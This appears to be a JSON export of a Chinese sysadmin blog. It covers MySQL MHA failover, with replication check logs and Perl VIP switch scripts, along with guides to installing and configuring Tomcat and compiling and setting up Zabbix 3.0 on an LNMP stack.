--relay_log_info=/home/mysql/data/relay-log.info --relay_dir=/home/mysql/data/ --slave_pass=xxxThu Jan 12 14:29:41 2017 - [info] Connecting to root@192.168.1.102(kp-bt-102:16812).. Checking slave recovery environment settings.. Opening /home/mysql/data/relay-log.info ... ok. Relay log found at /home/mysql/data, up to rep_relay_log.000003 Temporary relay log file is /home/mysql/data/rep_relay_log.000003 Testing mysql connection and privileges..mysql: [Warning] Using a password on the command line interface can be insecure. done. Testing mysqlbinlog output.. done. Cleaning up test file(s).. done.Thu Jan 12 14:29:41 2017 - [info] Executing command : apply_diff_relay_logs --command=test --slave_user=&apos;mha&apos; --slave_host=kp-bt-103 --slave_ip=192.168.1.103 --slave_port=3306 --workdir=/tmp --target_version=5.7.17-log --manager_version=0.57 --relay_log_info=/home/mysql/data/relay-log.info --relay_dir=/home/mysql/data/ --slave_pass=xxxThu Jan 12 14:29:41 2017 - [info] Connecting to root@192.168.1.103(kp-bt-103:16813).. Checking slave recovery environment settings.. Opening /home/mysql/data/relay-log.info ... ok. Relay log found at /home/mysql/data, up to rep_relay_log.000003 Temporary relay log file is /home/mysql/data/rep_relay_log.000003 Testing mysql connection and privileges..mysql: [Warning] Using a password on the command line interface can be insecure. done. Testing mysqlbinlog output.. done. Cleaning up test file(s).. done.Thu Jan 12 14:29:41 2017 - [info] Slaves settings check done.Thu Jan 12 14:29:41 2017 - [info] kp-bt-101(192.168.1.101:3306) (current master) +--kp-bt-102(192.168.1.102:3306) +--kp-bt-103(192.168.1.103:3306)Thu Jan 12 14:29:41 2017 - [info] Checking replication health on kp-bt-102..Thu Jan 12 14:29:41 2017 - [info] ok.Thu Jan 12 14:29:41 2017 - [info] Checking replication health on kp-bt-103..Thu Jan 12 14:29:41 2017 - [info] ok.Thu Jan 12 14:29:41 2017 - [warning] master_ip_failover_script is not defined.Thu Jan 12 14:29:41 2017 - [warning] shutdown_script is not defined.Thu Jan 12 14:29:41 2017 - [info] Got exit code 0 (Not master dead).MySQL Replication Health is OK. 配置自动故障vip切换脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116#!/usr/bin/env perl use strict;use warnings FATAL =&gt; &apos;all&apos;; use Getopt::Long; my ( $command, $ssh_user, $orig_master_host, $orig_master_ip, $orig_master_port, $new_master_host, $new_master_ip, $new_master_port); my $vip = &apos;192.168.1.110/16&apos;; # Virtual IPmy $interface = &apos;em2&apos;; #bind to interfacemy $key = &quot;1&quot;;my $ssh_start_vip = &quot;/sbin/ifconfig $interface:$key $vip&quot;;my $ssh_stop_vip = &quot;/sbin/ifconfig $interface:$key down&quot;;$ssh_user = &quot;root&quot;; GetOptions( &apos;command=s&apos; =&gt; \\$command, &apos;ssh_user=s&apos; =&gt; \\$ssh_user, &apos;orig_master_host=s&apos; =&gt; \\$orig_master_host, &apos;orig_master_ip=s&apos; =&gt; \\$orig_master_ip, &apos;orig_master_port=i&apos; =&gt; \\$orig_master_port, &apos;new_master_host=s&apos; =&gt; \\$new_master_host, &apos;new_master_ip=s&apos; =&gt; \\$new_master_ip, &apos;new_master_port=i&apos; =&gt; \\$new_master_port,); exit &amp;main(); sub main &#123; print &quot;\\n\\nIN SCRIPT TEST====$ssh_stop_vip==$ssh_start_vip===\\n\\n&quot;; if ( $command eq &quot;stop&quot; || $command eq &quot;stopssh&quot; ) &#123; # $orig_master_host, $orig_master_ip, $orig_master_port are passed. # If you manage master ip address at global catalog database, # invalidate orig_master_ip here. my $exit_code = 1; #eval &#123; # print &quot;Disabling the VIP on old master: $orig_master_host \\n&quot;; # &amp;stop_vip(); # $exit_code = 0; #&#125;; eval &#123; print &quot;Disabling the VIP on old master: $orig_master_host \\n&quot;; #my $ping=`ping -c 1 10.0.0.13 | grep &quot;packet loss&quot; | awk -F&apos;,&apos; &apos;&#123;print $3&#125;&apos; | awk &apos;&#123;print $1&#125;&apos;`; #if ( $ping le &quot;90.0%&quot; &amp;&amp; $ping gt &quot;0.0%&quot; )&#123; #$exit_code = 0; #&#125; #else &#123; &amp;stop_vip(); # updating global catalog, etc $exit_code = 0; #&#125; &#125;; if ($@) &#123; warn &quot;Got Error: $@\\n&quot;; exit $exit_code; &#125; exit $exit_code; &#125; elsif ( $command eq &quot;start&quot; ) &#123; # all arguments are passed. # If you manage master ip address at global catalog database, # activate new_master_ip here. # You can also grant write access (create user, set read_only=0, etc) here. my $exit_code = 10; eval &#123; print &quot;Enabling the VIP - $vip on the new master - $new_master_host \\n&quot;; &amp;start_vip(); $exit_code = 0; &#125;; if ($@) &#123; warn $@; exit $exit_code; &#125; exit $exit_code; &#125; elsif ( $command eq &quot;status&quot; ) &#123; print &quot;Checking the Status of the script.. OK \\n&quot;; `ssh $ssh_user\\@$orig_master_ip \\&quot; $ssh_start_vip \\&quot;`; exit 0; &#125; else &#123; &amp;usage(); exit 1; &#125;&#125; # A simple system call that enable the VIP on the new mastersub start_vip() &#123; `ssh $ssh_user\\@$new_master_host \\&quot; $ssh_start_vip \\&quot;`;&#125; # A simple system call that disable the VIP on the old_mastersub stop_vip() &#123; `ssh $ssh_user\\@$orig_master_host \\&quot; $ssh_stop_vip \\&quot;`;&#125; sub usage &#123; print &quot;Usage: master_ip_failover --command=start|stop|stopssh|status --orig_master_host=host --orig_master_ip=ip --orig_master_port=port --new_master_host=host --new_master_ip=ip --new_master_port=port\\n&quot;;&#125; 配置手动故障vip切换脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264#!/usr/bin/env perl# Copyright (C) 2011 DeNA Co.,Ltd.## This program is free software; you can redistribute it and/or modify# it under the terms of the GNU General Public License as published by# the Free Software Foundation; either version 2 of the License, or# (at your option) any later version.## This program is distributed in the hope that it will be useful,# but WITHOUT ANY WARRANTY; without even the implied warranty of# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the# GNU General Public License for more details.## You should have received a copy of the GNU General Public License# along with this program; if not, write to the Free Software# Foundation, Inc.,# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA## Note: This is a sample script and is not complete. Modify the script based on your environment.use strict;use warnings FATAL =&gt; &apos;all&apos;;use Getopt::Long;use MHA::DBHelper;use MHA::NodeUtil;use Time::HiRes qw( sleep gettimeofday tv_interval );use Data::Dumper;my $_tstart;my $_running_interval = 0.1;my ( $command, $orig_master_host, $orig_master_ip, $orig_master_port, $orig_master_user, $orig_master_ssh_user, $new_master_host, $new_master_ip, $new_master_port, $new_master_user, $new_master_ssh_user, $orig_master_is_new_slave, $orig_master_password, $new_master_password,);my $vip = &apos;192.168.1.110&apos;; ###Virtual IPmy $interface = &apos;em2&apos;; ###interfacemy $key = &quot;1&quot;;my $ssh_start_vip = &quot;/sbin/ifconfig $interface:$key $vip/16&quot;;my $flush_arp = &quot;/sbin/arping -I $interface -c 2 -s $vip&quot;;my $ssh_stop_vip = &quot;/sbin/ifconfig $interface:$key down&quot;;my $ssh_user = &quot;root&quot;;GetOptions( &apos;command=s&apos; =&gt; \\$command, &apos;ssh_user=s&apos; =&gt; \\$ssh_user, &apos;orig_master_host=s&apos; =&gt; \\$orig_master_host, &apos;orig_master_ip=s&apos; =&gt; \\$orig_master_ip, &apos;orig_master_port=i&apos; =&gt; \\$orig_master_port, &apos;orig_master_user=s&apos; =&gt; \\$orig_master_user, &apos;orig_master_password=s&apos; =&gt; \\$orig_master_password, &apos;new_master_host=s&apos; =&gt; \\$new_master_host, &apos;new_master_ip=s&apos; =&gt; \\$new_master_ip, &apos;new_master_port=i&apos; =&gt; \\$new_master_port, &apos;new_master_user=s&apos; =&gt; \\$new_master_user, &apos;new_master_password=s&apos; =&gt; \\$new_master_password, &apos;orig_master_ssh_user=s&apos; =&gt; \\$orig_master_ssh_user, &apos;new_master_ssh_user=s&apos; =&gt; \\$new_master_ssh_user, &apos;orig_master_is_new_slave&apos; =&gt; \\$orig_master_is_new_slave,);exit &amp;main();sub current_time_us &#123; my ( $sec, $microsec ) = gettimeofday(); my $curdate = localtime($sec); return $curdate . &quot; &quot; . sprintf( &quot;%06d&quot;, $microsec );&#125;sub sleep_until &#123; my $elapsed = tv_interval($_tstart); if ( $_running_interval &gt; $elapsed ) &#123; sleep( $_running_interval - $elapsed ); &#125;&#125;sub get_threads_util &#123; my $dbh = shift; my $my_connection_id = shift; my $running_time_threshold = shift; my $type = shift; $running_time_threshold = 0 unless ($running_time_threshold); $type = 0 unless ($type); my @threads; my $sth = $dbh-&gt;prepare(&quot;SHOW PROCESSLIST&quot;); $sth-&gt;execute(); while ( my $ref = $sth-&gt;fetchrow_hashref() ) &#123; my $id = $ref-&gt;&#123;Id&#125;; my $user = $ref-&gt;&#123;User&#125;; my $host = $ref-&gt;&#123;Host&#125;; my $command = $ref-&gt;&#123;Command&#125;; my $state = $ref-&gt;&#123;State&#125;; my $query_time = $ref-&gt;&#123;Time&#125;; my $info = $ref-&gt;&#123;Info&#125;; $info =~ s/^\\s*(.*?)\\s*$/$1/ if defined($info); next if ( $my_connection_id == $id ); next if ( defined($query_time) &amp;&amp; $query_time &lt; $running_time_threshold ); next if ( defined($command) &amp;&amp; $command eq &quot;Binlog Dump&quot; ); next if ( defined($user) &amp;&amp; $user eq &quot;system user&quot; ); next if ( defined($command) &amp;&amp; $command eq &quot;Sleep&quot; &amp;&amp; defined($query_time) &amp;&amp; $query_time &gt;= 1 ); if ( $type &gt;= 1 ) &#123; next if ( defined($command) &amp;&amp; $command eq &quot;Sleep&quot; ); next if ( defined($command) &amp;&amp; $command eq &quot;Connect&quot; ); &#125; if ( $type &gt;= 2 ) &#123; next if ( defined($info) &amp;&amp; $info =~ m/^select/i ); next if ( defined($info) &amp;&amp; $info =~ m/^show/i ); &#125; push @threads, $ref; &#125; return @threads;&#125;sub main &#123; if ( $command eq &quot;stop&quot; ) &#123; ## Gracefully killing connections on the current master # 1. Set read_only= 1 on the new master # 2. DROP USER so that no app user can establish new connections # 3. Set read_only= 1 on the current master # 4. Kill current queries # * Any database access failure will result in script die. my $exit_code = 1; eval &#123; ## Setting read_only=1 on the new master (to avoid accident) my $new_master_handler = new MHA::DBHelper(); # args: hostname, port, user, password, raise_error(die_on_error)_or_not $new_master_handler-&gt;connect( $new_master_ip, $new_master_port, $new_master_user, $new_master_password, 1 ); print current_time_us() . &quot; Set read_only on the new master.. &quot;; $new_master_handler-&gt;enable_read_only(); if ( $new_master_handler-&gt;is_read_only() ) &#123; print &quot;ok.\\n&quot;; &#125; else &#123; die &quot;Failed!\\n&quot;; &#125; $new_master_handler-&gt;disconnect(); # Connecting to the orig master, die if any database error happens my $orig_master_handler = new MHA::DBHelper(); $orig_master_handler-&gt;connect( $orig_master_ip, $orig_master_port, $orig_master_user, $orig_master_password, 1 ); ## Drop application user so that nobody can connect. Disabling per-session binlog beforehand #$orig_master_handler-&gt;disable_log_bin_local(); #print current_time_us() . &quot; Drpping app user on the orig master..\\n&quot;; #FIXME_xxx_drop_app_user($orig_master_handler); ## Waiting for N * 100 milliseconds so that current connections can exit my $time_until_read_only = 15; $_tstart = [gettimeofday]; my @threads = get_threads_util( $orig_master_handler-&gt;&#123;dbh&#125;, $orig_master_handler-&gt;&#123;connection_id&#125; ); while ( $time_until_read_only &gt; 0 &amp;&amp; $#threads &gt;= 0 ) &#123; if ( $time_until_read_only % 5 == 0 ) &#123; printf&quot;%s Waiting all running %d threads are disconnected.. (max %d milliseconds)\\n&quot;, current_time_us(), $#threads + 1, $time_until_read_only * 100; if ( $#threads &lt; 5 ) &#123; print Data::Dumper-&gt;new( [$_] )-&gt;Indent(0)-&gt;Terse(1)-&gt;Dump . &quot;\\n&quot; foreach (@threads); &#125; &#125; sleep_until(); $_tstart = [gettimeofday]; $time_until_read_only--; @threads = get_threads_util( $orig_master_handler-&gt;&#123;dbh&#125;, $orig_master_handler-&gt;&#123;connection_id&#125; ); &#125; ## Setting read_only=1 on the current master so that nobody(except SUPER) can write print current_time_us() . &quot; Set read_only=1 on the orig master.. &quot;; $orig_master_handler-&gt;enable_read_only(); if ( $orig_master_handler-&gt;is_read_only() ) &#123; print &quot;ok.\\n&quot;; &#125; else &#123; die &quot;Failed!\\n&quot;; &#125; ## Waiting for M * 100 milliseconds so that current update queries can complete my $time_until_kill_threads = 5; @threads = get_threads_util( $orig_master_handler-&gt;&#123;dbh&#125;, $orig_master_handler-&gt;&#123;connection_id&#125; ); while ( $time_until_kill_threads &gt; 0 &amp;&amp; $#threads &gt;= 0 ) &#123; if ( $time_until_kill_threads % 5 == 0 ) &#123; printf&quot;%s Waiting all running %d queries are disconnected.. (max %d milliseconds)\\n&quot;, current_time_us(), $#threads + 1, $time_until_kill_threads * 100; if ( $#threads &lt; 5 ) &#123; print Data::Dumper-&gt;new( [$_] )-&gt;Indent(0)-&gt;Terse(1)-&gt;Dump . &quot;\\n&quot; foreach (@threads); &#125; &#125; sleep_until(); $_tstart = [gettimeofday]; $time_until_kill_threads--; @threads = get_threads_util( $orig_master_handler-&gt;&#123;dbh&#125;, $orig_master_handler-&gt;&#123;connection_id&#125; ); &amp;stop_vip(); ## Terminating all threads print current_time_us() . &quot; Killing all application threads..\\n&quot;; $orig_master_handler-&gt;kill_threads(@threads) if ( $#threads &gt;= 0 ); print current_time_us() . &quot; done.\\n&quot;; #$orig_master_handler-&gt;enable_log_bin_local(); $orig_master_handler-&gt;disconnect(); ## After finishing the script, MHA executes FLUSH TABLES WITH READ LOCK $exit_code = 0; &#125;; if ($@) &#123; warn &quot;Got Error: $@\\n&quot;; exit $exit_code; &#125; exit $exit_code; &#125; elsif ( $command eq &quot;start&quot; ) &#123; ## Activating master ip on the new master # 1. Create app user with write privileges # 2. Moving backup script if needed # 3. Register new master&apos;s ip to the catalog database# If exit code is 0 or 10, MHA does not abort my $exit_code = 10; eval &#123; my $new_master_handler = new MHA::DBHelper(); # args: hostname, port, user, password, raise_error_or_not $new_master_handler-&gt;connect( $new_master_ip, $new_master_port, $new_master_user, $new_master_password, 1 ); ## Set read_only=0 on the new master #$new_master_handler-&gt;disable_log_bin_local(); print current_time_us() . &quot; Set read_only=0 on the new master.\\n&quot;; $new_master_handler-&gt;disable_read_only(); ## Creating an app user on the new master #print current_time_us() . &quot; Creating app user on the new master..\\n&quot;; #FIXME_xxx_create_app_user($new_master_handler); #$new_master_handler-&gt;enable_log_bin_local(); $new_master_handler-&gt;disconnect(); ## Update master ip on the catalog database, etc print &quot;Enabling the VIP - $vip on the new master - $new_master_host \\n&quot;; &amp;start_vip(); &amp;flush_arp(); $exit_code = 0; &#125;; if ($@) &#123; warn &quot;Got Error: $@\\n&quot;; exit $exit_code; &#125; exit $exit_code; &#125; exit 0; &#125; else &#123; &amp;usage(); exit 1; &#125;&#125;# A simple system call that enable the VIP on the new mastersub start_vip() &#123; `ssh $ssh_user\\@$new_master_host \\&quot; $ssh_start_vip \\&quot;`;&#125;# A simple system call that disable the VIP on the old_mastersub stop_vip() &#123; `ssh $ssh_user\\@$orig_master_host \\&quot; $ssh_stop_vip \\&quot;`;&#125;#flush arpsub flush_arp() &#123; `ssh $ssh_user\\@$new_master_host \\&quot; $flush_arp \\&quot;`;&#125;sub usage &#123; print&quot;Usage: master_ip_online_change --command=start|stop|status --orig_master_host=host --orig_master_ip=ip --orig_master_port=port --new_master_host=host --new_master_ip=ip --new_master_port=port\\n&quot;; die;&#125; 检查集群状态12# masterha_check_repl --conf=/etc/masterha/app1.cnf# masterha_check_ssh --conf=/etc/masterha/app1.cnf 启动和关闭MHA-manager12345启动# nohup masterha_manager --conf=/etc/masterha/app1.cnf &gt; /etc/masterha//mha_manager.log &lt; /dev/null 2&gt;&amp;1 &amp;关闭masterha_stop --conf=/etc/masterha/app1.cnf 检查MHA-manager状态12# masterha_check_status --conf=/etc/masterha/app1.cnfapp1 (pid:50523) is running(0:PING_OK), master:kp-bt-101","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://blog.unixmen.cn/categories/Linux/"},{"name":"MySQL","slug":"Linux/MySQL","permalink":"http://blog.unixmen.cn/categories/Linux/MySQL/"}],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"http://blog.unixmen.cn/tags/MySQL/"},{"name":"MHA","slug":"MHA","permalink":"http://blog.unixmen.cn/tags/MHA/"}]},{"title":"Tomcat安装配置","slug":"Tomcat+安装配置","date":"2017-01-09T16:00:00.000Z","updated":"2018-06-11T14:53:04.000Z","comments":true,"path":"2017/01/10/Tomcat+安装配置/","link":"","permalink":"http://blog.unixmen.cn/2017/01/10/Tomcat+安装配置/","excerpt":"安装JDK1# rpm -ivh jdk-8u111-linux-x64.rpm\n配置JAVA环境变量123# vim /etc/profile.d/java.shexport JAVA_HOME=/usr/java/latestexport PATH=$JAVA_HOME/bin:$PATH\n导出环境变量1# source /etc/profile.d/java.sh\n查看JAVA版本1# java -version\n解压tomcat到指定目录12# tar zxf apache-tomcat-8.0.39.tar.gz -C /usr/local/# ln -s /usr/local/apache-tomcat-8.0.39/ /usr/local/tomcat\n配置tomcat环境变量123# vim /etc/profile.d/tomcat.shexport CATALINA_HOME=/usr/local/tomcatexport PATH=$CATALINA_HOME/bin:$PATH","text":"安装JDK1# rpm -ivh jdk-8u111-linux-x64.rpm 配置JAVA环境变量123# vim /etc/profile.d/java.shexport JAVA_HOME=/usr/java/latestexport PATH=$JAVA_HOME/bin:$PATH 导出环境变量1# source /etc/profile.d/java.sh 查看JAVA版本1# java -version 解压tomcat到指定目录12# tar zxf apache-tomcat-8.0.39.tar.gz -C /usr/local/# ln -s /usr/local/apache-tomcat-8.0.39/ /usr/local/tomcat 配置tomcat环境变量123# vim /etc/profile.d/tomcat.shexport CATALINA_HOME=/usr/local/tomcatexport PATH=$CATALINA_HOME/bin:$PATH 导出tomcat环境变量1# source /etc/profile.d/tomcat.sh 查看tomcat版本1# catalina.sh version 启动tomcat1# catalina.sh start 隐藏tomcat版本信息12345678910在线上生产环境中，为了防止tomcat版本信息暴露导致的恶意攻击，我们需要将tomcat版本隐藏# cd $CATALINA_HOME/lib/# unzip catalina.jar# vim org/apache/catalina/util/ServerInfo.propertiesserver.info=Apache Tomcat/Xserver.number=X# jar uvf catalina.jar org/apache/catalina/util/ServerInfo.properties# catalina.sh stop# catalina.sh start","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://blog.unixmen.cn/categories/Linux/"},{"name":"Tomcat","slug":"Linux/Tomcat","permalink":"http://blog.unixmen.cn/categories/Linux/Tomcat/"}],"tags":[{"name":"tomcat","slug":"tomcat","permalink":"http://blog.unixmen.cn/tags/tomcat/"},{"name":"安装配置","slug":"安装配置","permalink":"http://blog.unixmen.cn/tags/安装配置/"}]},{"title":"编译安装配置Zabbix 3.0监控平台","slug":"zabbix3.0+install","date":"2016-12-19T16:00:00.000Z","updated":"2018-06-11T14:53:04.000Z","comments":true,"path":"2016/12/20/zabbix3.0+install/","link":"","permalink":"http://blog.unixmen.cn/2016/12/20/zabbix3.0+install/","excerpt":"1. 前言\nzabbix是一个基于WEB页面提供分布式系统监视以及网络监视功能的企业级开源解决方案。基于C/S架构，支持多种采集方式和采集客户端，有专用的Agent，也支持SNMP、IPMI、JMX、Telnet、SSH等多种协议，它可以运行在Linux，Solaris，HP-UX，AIX，Free BSD，Open BSD，OS X等平台上，它将采集到的数据存放到数据库，然后对其进行分析整理，达到条件触发告警。对于运维工作来说，zabbix是一个不可或缺的企业监控工具，在日常业务环境中可以选择直接通过yum方式安装或者编译源码安装，因为本人喜欢将zabbix安装到自定义位置，故选择编译安装。\n\n2. 部署前准备工作2.1 部署规划\nzabbix目前提供了三个版本的源码包供下载安装，分别是：Zabbix 2.2 LTS、Zabbix 3.0 LTS、Zabbix 3.2。Zabbix2.2与3.0均为LTS即Long Term Support（长期支持）版本，Zabbix LTS版本可以为客户提供5年的技术支持，包括3年的全服务支持（一般，严重和安全的问题的解决）和后2年的限制性支持（只包括严重和安全问题的解决）。LTS版本发布会改变版本号第一个数字，比如X版本，X+1版本。而3.2属于标准版本，标准版本会为客户提供6个月的全支持（一般，严重和安全的问题的解决）直到下一个稳定版本发布，还会提供附加一个月的限制性支持（只包括严重和安全问题的解决）。标准版本会改变版本号的第二个数字，比如：X.4、X.6版本。基于业务稳定性考虑，采用LTS版本更为稳妥，同时3.0 LTS相对于2.2 LTS在WEB界面与中文支持以及其他一些重要功能上做了很大的提升，因此我们选择3.0 LTS版本。zabbix的web管理界面需要php+MySQL环境支持，在此我们选择LNMP环境。zabbix的web页面安装路径：/home/zabbixzabbix服务安装路径：/usr/local/zabbixMySQL安装路径：/home/mysql\n","text":"1. 前言 zabbix是一个基于WEB页面提供分布式系统监视以及网络监视功能的企业级开源解决方案。基于C/S架构，支持多种采集方式和采集客户端，有专用的Agent，也支持SNMP、IPMI、JMX、Telnet、SSH等多种协议，它可以运行在Linux，Solaris，HP-UX，AIX，Free BSD，Open BSD，OS X等平台上，它将采集到的数据存放到数据库，然后对其进行分析整理，达到条件触发告警。对于运维工作来说，zabbix是一个不可或缺的企业监控工具，在日常业务环境中可以选择直接通过yum方式安装或者编译源码安装，因为本人喜欢将zabbix安装到自定义位置，故选择编译安装。 2. 部署前准备工作2.1 部署规划 zabbix目前提供了三个版本的源码包供下载安装，分别是：Zabbix 2.2 LTS、Zabbix 3.0 LTS、Zabbix 3.2。Zabbix2.2与3.0均为LTS即Long Term Support（长期支持）版本，Zabbix LTS版本可以为客户提供5年的技术支持，包括3年的全服务支持（一般，严重和安全的问题的解决）和后2年的限制性支持（只包括严重和安全问题的解决）。LTS版本发布会改变版本号第一个数字，比如X版本，X+1版本。而3.2属于标准版本，标准版本会为客户提供6个月的全支持（一般，严重和安全的问题的解决）直到下一个稳定版本发布，还会提供附加一个月的限制性支持（只包括严重和安全问题的解决）。标准版本会改变版本号的第二个数字，比如：X.4、X.6版本。基于业务稳定性考虑，采用LTS版本更为稳妥，同时3.0 LTS相对于2.2 LTS在WEB界面与中文支持以及其他一些重要功能上做了很大的提升，因此我们选择3.0 LTS版本。zabbix的web管理界面需要php+MySQL环境支持，在此我们选择LNMP环境。zabbix的web页面安装路径：/home/zabbixzabbix服务安装路径：/usr/local/zabbixMySQL安装路径：/home/mysql 2.2 下载软件包123# wget http://sourceforge.net/projects/zabbix/files/ZABBIX%20Latest%20Stable/3.0.8/zabbix-3.0.8.tar.gz# lszabbix-3.0.8.tar.gz 2.3 创建相关安装目录123456789101112# mkdir -pv /home/&#123;zabbix,mysql&#125;mkdir: created directory `/home/zabbix&apos;mkdir: created directory `/home/mysql&apos;# tree /home//home/├── mysql│ └── data├── soft│ └── zabbix-3.0.8.tar.gz└── zabbix# mkdir /usr/local/zabbix/log 3. 安装配置LNMP环境 因为zabbix的web管理需要php环境支持，所以先配置LNMP环境，配置过程参考前文，此处不再赘述。 1234php编译参数# ./configure --prefix=/usr/local/php --with-config-file-path=/usr/local/php/etc --with-fpm-user=www --with-fpm-group=www --enable-mysqlnd --with-mysqli=mysqlnd --with-pdo-mysql=mysqlnd --enable-ftp --enable-zip --with-bz2 --with-jpeg-dir --with-png-dir --with-freetype-dir --with-libxml-dir --with-xmlrpc --with-zlib-dir --with-gd --enable-gd-native-ttf --with-curl --enable-mbstring --enable-bcmath --enable-sockets --enable-exif --enable-fpm --with-mcrypt --with-mhash --with-gmp --enable-inline-optimization --with-openssl --with-pcre-dir --enable-soap --with-gettext如果不加--with-gettext参数，zabbix将无法切换语言。 12MySQL编译参数# cmake -DCMAKE_INSTALL_PREFIX=/home/mysql -DMYSQL_UNIX_ADDR=/tmp/mysql.sock -DDEFAULT_CHARSET=utf8 -DDEFAULT_COLLATION=utf8_general_ci -DWITH_MYISAM_STORAGE_ENGINE=1 -DWITH_INNOBASE_STORAGE_ENGINE=1 -DWITH_MEMORY_STORAGE_ENGINE=1 -DWITH_READLINE=1 -DENABLED_LOCAL_INFILE=1 -DMYSQL_DATADIR=/home/mysql/data -DMYSQL_USER=mysql -DMYSQL_TCP_PORT=3406 -DWITH_BOOST=/usr/local/boost 程序包如下：12345678910# tree.├── mysql-5.7.15.tar.gz├── openresty│ ├── drizzle7-2011.07.21.tar.gz│ ├── openresty-1.11.2.1.tar.gz│ ├── openssl-1.0.2j.tar.gz│ ├── pcre-8.38.tar.gz│ └── zlib-1.2.8.tar.gz└── zabbix-3.0.8.tar.gz 4. 编译安装zabbix4.1 创建zabbix服务用户12# groupadd zabbix# useradd zabbix -g zabbix -s /sbin/nologin 4.2 安装依赖包1# yum install -y net-snmp-devel curl-devel unixODBC-devel OpenIPMI-devel java-devel libssh2-devel openldap-devel 4.3 编译前配置123# pwd/home/soft/zabbix-3.0.8# ./configure --prefix=/usr/local/zabbix --enable-server --enable-agent --enable-ipv6 --with-mysql --with-net-snmp --with-libcurl -with-openipmi --with-unixodbc --with-ldap --with-ssh2 --with-iconv --enable-java 4.4 编译安装zabbix12# make &amp;&amp; make install# chown -R zabbix.zabbix /usr/local/zabbix/ 4.5 为zabbix提供启动脚本123456# cp misc/init.d/fedora/core/zabbix_* /etc/init.d/# chmod +x /etc/init.d/zabbix_*# sed -i &apos;s@BASEDIR=/usr/local@BASEDIR=/usr/local/zabbix@g&apos; /etc/init.d/zabbix_agentd# sed -i &apos;s@BASEDIR=/usr/local@BASEDIR=/usr/local/zabbix@g&apos; /etc/init.d/zabbix_server# chkconfig zabbix_server on# chkconfig zabbix_agentd on 4.6 创建zabbix数据库并导入数据1234567891011121314mysql&gt; create database zabbix character set utf8;Query OK, 1 row affected (0.00 sec)mysql&gt; grant all privileges on zabbix.* to zabbix@localhost identified by &apos;zabbix&apos;;Query OK, 0 rows affected, 2 warnings (0.01 sec)mysql&gt; flush privileges;# mysql -uzabbix -pzabbix zabbix测试新建数据库访问正常。# mysql -uzabbix -pzabbix zabbix &lt; ./database/mysql/schema.sql# mysql -uzabbix -pzabbix zabbix &lt; ./database/mysql/images.sql # mysql -uzabbix -pzabbix zabbix &lt; ./database/mysql/data.sql 4.7 修改zabbix配置文件12345678910111213141516171819202122232425262728# # vim /usr/local/zabbix/etc/zabbix_server.confListenPort=10051LogFile=/usr/local/zabbix/log/zabbix_server.logLogFileSize=1DebugLevel=3PidFile=/usr/local/zabbix/log/zabbix_server.pidDBHost=localhostDBName=zabbixDBUser=zabbixDBPassword=zabbixDBSocket=/home/mysql/tmp/mysql.sockDBPort=3406ListenIP=0.0.0.0Timeout=4LogSlowQueries=3000# vim /usr/local/zabbix/etc/zabbix_agentd.confPidFile=/usr/local/zabbix/log/zabbix_agentd.pidLogType=fileLogFile=/usr/local/zabbix/log/zabbix_agentd.logLogFileSize=1DebugLevel=3Server=127.0.0.1ListenPort=10050ListenIP=0.0.0.0ServerActive=127.0.0.1Hostname=Zabbix server 4.8 启动zabbix-server、zabbix-agentd服务启动服务1# service zabbix_server start 如启动报错12Starting zabbix_server: /usr/local/zabbix/sbin/zabbix_server: error while loading shared libraries: libmysqlclient.so.20: cannot open shared object file: No such file or directory [FAILED] 检查是否库文件不存在1# ldd $(which /usr/local/zabbix/sbin/zabbix_server) 确有一条1libmysqlclient.so.20 =&gt; not found 解决办法123# vim /etc/ld.so.conf.d/mysql.conf/home/mysql/lib# ldconfig 再次启动服务12# service zabbix_server start# service zabbix_agentd start 5. 安装配置zabbix WEB前端5.1 安装前相关配置12345678910# vim /etc/php.ini （此处的php.ini以服务器上实际位置为准）memory_limit = 128Mpost_max_size = 16Mupload_max_filesize = 2Mmax_execution_time = 300max_input_time = 300session.auto_start = 0mbstring.func_overload = 0always_populate_raw_post_data = -1date.timezone = Asia/Shanghai 5.2 准备WEB前端文件1234# pwd /home/soft/zabbix-3.0.8# cp -r frontends/php/* /home/zabbix-web/# chown -R www.www /home/zabbix-web/ 5.3 配置nginx相关zabbix网站配置123456789101112131415161718192021222324# vim /usr/local/openresty/nginx/conf/nginx.conf server &#123; listen 80; server_name localhost; charset utf-8; location / &#123; root /home/zabbix; index index.php index.html index.htm; &#125; error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root html; &#125; location ~ \\.php$ &#123; root /home/zabbix; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name; #include fastcgi_params; include fastcgi.conf; &#125; &#125; 5.4 访问WEB页面配置zabbix web1http://IP 5.5 解决zabbix web界面部分中文乱码的问题zabbix web安装完成后，默认的中文支持并不完善，在部分页面仍会出现中文支持不完全的问题，原因在于zabbix程序保重默认的字体文件DejaVuSans.ttf对中文支持不完善，所以需要我们自行上传中文字体并修改配置文件。具体操作如下：123456789101112131415在这里我采用的是微软雅黑字体，首先将微软字体库中的雅黑字体文件上传至zabbix服务器/home/zabbix-web/fonts/目录# ls /home/zabbix-web/fonts/DejaVuSans.ttf msyh.ttf然后修改相应配置文件：# pwd/home/zabbix-web/include# vim +45 defines.inc.phpdefine(&apos;ZBX_GRAPH_FONT_NAME&apos;, &apos;msyh&apos;); // font file name第45行，将字体文件名更改为你上传的字体文件名，我这里用的是&quot;msyh&quot;# vim +93 defines.inc.phpdefine(&apos;ZBX_FONT_NAME&apos;, &apos;msyh&apos;);第93行，同45行一致，修改字体文件名。 